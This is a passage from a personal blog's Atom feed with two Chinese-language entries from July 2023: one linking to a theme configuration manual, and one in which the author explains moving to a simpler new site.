    <link href="https://kidder1.github.io/2023/07/17/%E5%8D%9A%E5%AE%A2%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E%E4%B9%A6/"/>
    <id>https://kidder1.github.io/2023/07/17/%E5%8D%9A%E5%AE%A2%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E%E4%B9%A6/</id>
    <published>2023-07-16T16:00:00.000Z</published>
    <updated>2023-07-17T15:39:37.886Z</updated>
    
    <content type="html"><![CDATA[<p>主题配置说明书：<a href="https://minimalism.codeover.cn/docs/introduction">https://minimalism.codeover.cn/docs/introduction</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;主题配置说明书：&lt;a href=&quot;https://minimalism.codeover.cn/docs/introduction&quot;&gt;https://minimalism.codeover.cn/docs/introduction&lt;/a&gt;&lt;/p&gt;
</summary>
      
    
    
    
    <category term="Begin" scheme="https://kidder1.github.io/categories/Begin/"/>
    
    
  </entry>
  
  <entry>
    <title>转站说明</title>
    <link href="https://kidder1.github.io/2023/07/17/%E8%AF%B4%E6%98%8E/"/>
    <id>https://kidder1.github.io/2023/07/17/%E8%AF%B4%E6%98%8E/</id>
    <published>2023-07-16T16:00:00.000Z</published>
    <updated>2023-07-17T15:55:31.007Z</updated>
    
    <content type="html"><![CDATA[<p>懒得维护这么一个网站，东西越多，事情越多，很多东西不能专注，然后就会报复性的放松和逃避，我想这不是一个解决事情的好办法。想来想去，还是决定从一个新的地方开始了。<br>美化的尽头总是简约了，目的还是记录一些后面可以用的到的东西。关于我有我的微信，希望大家喜欢和和多多交流。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;懒得维护这么一个网站，东西越多，事情越多，很多东西不能专注，然后就会报复性的放松和逃避，我想这不是一个解决事情的好办法。想来想去，还是决定从一个新的地方开始了。&lt;br&gt;美化的尽头总是简约了，目的还是记录一些后面可以用的到的东西。关于我有我的微信，希望大家喜欢和和多多交流。&lt;</summary>
      
    
    
    
    <category term="Begin" scheme="https://kidder1.github.io/categories/Begin/"/>
    
    
  </entry>
  
</feed>
